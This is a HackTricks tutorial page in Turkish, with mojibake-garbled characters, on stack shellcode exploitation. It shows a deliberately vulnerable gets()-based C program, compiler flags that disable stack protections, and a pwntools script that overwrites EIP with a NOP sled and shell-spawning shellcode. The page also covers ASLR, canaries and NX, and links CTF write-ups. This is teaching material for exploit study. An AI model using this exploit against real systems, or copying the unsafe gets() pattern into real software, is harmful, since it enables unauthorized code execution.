# YÄ±ÄŸÄ±n Kabuk Kodu

<details>

<summary><strong>AWS hacklemeyi sÄ±fÄ±rdan kahramana Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS KÄ±rmÄ±zÄ± TakÄ±m UzmanÄ±)</strong></a><strong> ile!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na(https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**PEASS Ailesi'ni**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **Hacking pÃ¼f noktalarÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

## Temel Bilgiler

**YÄ±ÄŸÄ±n kabuk kodu**, bir saldÄ±rganÄ±n zayÄ±f bir programÄ±n yÄ±ÄŸÄ±nÄ±na kabuk kodu yazdÄ±ÄŸÄ± ve ardÄ±ndan **Komut Ä°ÅŸaretÃ§isi (IP)** veya **GeniÅŸletilmiÅŸ Komut Ä°ÅŸaretÃ§isi (EIP)**'yi bu kabuk kodunun konumuna yÃ¶nlendirdiÄŸi **binary exploitation** tekniÄŸidir. Bu, yetkisiz eriÅŸim elde etmek veya hedef sistemde keyfi komutlar Ã§alÄ±ÅŸtÄ±rmak iÃ§in kullanÄ±lan klasik bir yÃ¶ntemdir. Ä°ÅŸte bu sÃ¼recin ayrÄ±ntÄ±larÄ±, basit bir C Ã¶rneÄŸi ve **pwntools** ile Python kullanarak buna karÅŸÄ±lÄ±k gelen bir saldÄ±rÄ±yÄ± nasÄ±l yazabileceÄŸiniz.

### C Ã–rneÄŸi: ZayÄ±f Bir Program

Basit bir zayÄ±f C programÄ± Ã¶rneÄŸiyle baÅŸlayalÄ±m:
```c
#include <stdio.h>
#include <string.h>

void vulnerable_function() {
char buffer[64];
gets(buffer); // Unsafe function that does not check for buffer overflow
}

int main() {
vulnerable_function();
printf("Returned safely\n");
return 0;
}
```
Bu program, `gets()` fonksiyonunun kullanÄ±mÄ±ndan kaynaklanan bir tampon taÅŸmasÄ± saldÄ±rÄ±sÄ±na aÃ§Ä±ktÄ±r.

### Derleme

Bu programÄ± derlemek iÃ§in Ã§eÅŸitli korumalarÄ± devre dÄ±ÅŸÄ± bÄ±rakarak (zafiyetli bir ortamÄ± simÃ¼le etmek iÃ§in) aÅŸaÄŸÄ±daki komutu kullanabilirsiniz:
```sh
gcc -m32 -fno-stack-protector -z execstack -no-pie -o vulnerable vulnerable.c
```
* `-fno-stack-protector`: YÄ±ÄŸÄ±n korumasÄ±nÄ± devre dÄ±ÅŸÄ± bÄ±rakÄ±r.
* `-z execstack`: YÄ±ÄŸÄ±nÄ± yÃ¼rÃ¼tÃ¼lebilir yapar, yÄ±ÄŸÄ±nda depolanan shellcode'un yÃ¼rÃ¼tÃ¼lmesi iÃ§in gereklidir.
* `-no-pie`: Konum BaÄŸÄ±msÄ±z YÃ¼rÃ¼tÃ¼lebilir'i devre dÄ±ÅŸÄ± bÄ±rakÄ±r, shellcode'un yerleÅŸeceÄŸi bellek adresini tahmin etmeyi kolaylaÅŸtÄ±rÄ±r.
* `-m32`: ProgramÄ± 32 bitlik yÃ¼rÃ¼tÃ¼lebilir olarak derler, genellikle exploit geliÅŸtirme sÃ¼recinde basitlik iÃ§in kullanÄ±lÄ±r.

### Pwntools Kullanarak Python Exploit'i

Ä°ÅŸte **pwntools** kullanarak bir **ret2shellcode** saldÄ±rÄ±sÄ± gerÃ§ekleÅŸtirmek iÃ§in Python'da nasÄ±l bir exploit yazabileceÄŸinizi:
```python
from pwn import *

# Set up the process and context
binary_path = './vulnerable'
p = process(binary_path)
context.binary = binary_path
context.arch = 'i386' # Specify the architecture

# Generate the shellcode
shellcode = asm(shellcraft.sh()) # Using pwntools to generate shellcode for opening a shell

# Find the offset to EIP
offset = cyclic_find(0x6161616c) # Assuming 0x6161616c is the value found in EIP after a crash

# Prepare the payload
# The NOP slide helps to ensure that the execution flow hits the shellcode.
nop_slide = asm('nop') * (offset - len(shellcode))
payload = nop_slide + shellcode
payload += b'A' * (offset - len(payload))  # Adjust the payload size to exactly fill the buffer and overwrite EIP
payload += p32(0xffffcfb4) # Supossing 0xffffcfb4 will be inside NOP slide

# Send the payload
p.sendline(payload)
p.interactive()
```
Bu betik, bir **NOP kaydÄ±rmasÄ±**, **shellcode** ve ardÄ±ndan **EIP**'yi NOP kaydÄ±rmasÄ±na iÅŸaret eden bir adrese Ã¼zerine yazarak shellcode'un yÃ¼rÃ¼tÃ¼lmesini saÄŸlayan bir yÃ¼k oluÅŸturur.

**NOP kaydÄ±rmasÄ±** (`asm('nop')`), yÃ¼rÃ¼tmenin tam adresinden baÄŸÄ±msÄ±z olarak shellcode'a "kaydÄ±rÄ±lmasÄ±nÄ±" saÄŸlamak iÃ§in kullanÄ±lÄ±r. `p32()` argÃ¼manÄ±nÄ±, tam adresinizin baÅŸlangÄ±Ã§ adresine ve NOP kaydÄ±rmasÄ±na inmek iÃ§in bir ofset ekleyerek ayarlayÄ±n.

## Korumalar

* [**ASLR**](../../common-binary-protections-and-bypasses/aslr/) adresin her yÃ¼rÃ¼tmede gÃ¼venilir olmasÄ± iÃ§in **devre dÄ±ÅŸÄ± bÄ±rakÄ±lmalÄ±dÄ±r** veya iÅŸlevin depolanacaÄŸÄ± adres her zaman aynÄ± olmayacak ve kazan iÅŸlevinin nerede yÃ¼klendiÄŸini bulmak iÃ§in bir sÄ±zÄ±ntÄ±ya ihtiyacÄ±nÄ±z olacaktÄ±r.
* [**Stack Canaries**](../../common-binary-protections-and-bypasses/stack-canaries/) da devre dÄ±ÅŸÄ± bÄ±rakÄ±lmalÄ±dÄ±r veya tehlikeye atÄ±lan EIP dÃ¶nÃ¼ÅŸ adresi asla takip edilmeyecektir.
* [**NX**](../../common-binary-protections-and-bypasses/no-exec-nx.md) **stack** korumasÄ±, stack iÃ§indeki shellcode'un yÃ¼rÃ¼tÃ¼lmesini engelleyecektir Ã§Ã¼nkÃ¼ bu bÃ¶lge yÃ¼rÃ¼tÃ¼lebilir olmayacaktÄ±r.

## DiÄŸer Ã–rnekler ve Referanslar

* [https://ir0nstone.gitbook.io/notes/types/stack/shellcode](https://ir0nstone.gitbook.io/notes/types/stack/shellcode)
* [https://guyinatuxedo.github.io/06-bof\_shellcode/csaw17\_pilot/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/csaw17\_pilot/index.html)
* 64 bit, ASLR ile stack adres sÄ±zÄ±ntÄ±sÄ±, shellcode yazma ve ona atlamak
* [https://guyinatuxedo.github.io/06-bof\_shellcode/tamu19\_pwn3/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/tamu19\_pwn3/index.html)
* 32 bit, ASLR ile stack sÄ±zÄ±ntÄ±sÄ±, shellcode yazma ve ona atlamak
* [https://guyinatuxedo.github.io/06-bof\_shellcode/tu18\_shellaeasy/index.html](https://guyinatuxedo.github.io/06-bof\_shellcode/tu18\_shellaeasy/index.html)
* 32 bit, ASLR ile stack sÄ±zÄ±ntÄ±sÄ±, Ã§Ä±kÄ±ÅŸ Ã§aÄŸrÄ±sÄ±nÄ± Ã¶nlemek iÃ§in karÅŸÄ±laÅŸtÄ±rma, deÄŸiÅŸkeni bir deÄŸerle Ã¼zerine yazma ve shellcode yazma ve ona atlamak
* [https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/](https://8ksec.io/arm64-reversing-and-exploitation-part-4-using-mprotect-to-bypass-nx-protection-8ksec-blogs/)
* arm64, ASLR yok, stack'i yÃ¼rÃ¼tÃ¼lebilir yapmak iÃ§in ROP cihazÄ± ve stack'teki shellcode'a atlamak

<details>

<summary><strong>SÄ±fÄ±rdan baÅŸlayarak AWS hacklemeyi</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> Ã¶ÄŸrenin!</strong></summary>

HackTricks'i desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**](https://github.com/sponsors/carlospolop)'na gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**](https://opensea.io/collection/the-peass-family) koleksiyonumuz
* ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n veya bizi Twitter'da ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)'Ä± takip edin.
* **Hacking hilelerinizi paylaÅŸarak HackTricks ve HackTricks Cloud** github depolarÄ±na PR gÃ¶ndererek katkÄ±da bulunun.

</details>
